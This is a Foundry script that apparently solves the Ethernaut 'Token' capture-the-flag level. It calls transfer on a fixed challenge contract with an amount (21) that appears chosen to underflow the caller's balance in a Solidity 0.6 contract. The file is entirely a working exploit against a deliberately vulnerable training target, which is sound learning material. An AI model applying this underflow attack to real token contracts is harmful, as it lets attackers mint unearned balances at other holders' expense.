// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/05_Token.sol";

contract ExploitScript is Script {
    
    address myAddress = vm.envAddress("ACCOUNT_ADDRESS");
    Token level05 = Token(0xcfA4F5B338e71e095Be602eEef8a91e25aE29f44);

    function run() external {
        vm.startBroadcast();

        level05.balanceOf(myAddress);
        level05.transfer(0xcfA4F5B338e71e095Be602eEef8a91e25aE29f44, 21);
        level05.balanceOf(myAddress);

        vm.stopBroadcast();
    }
}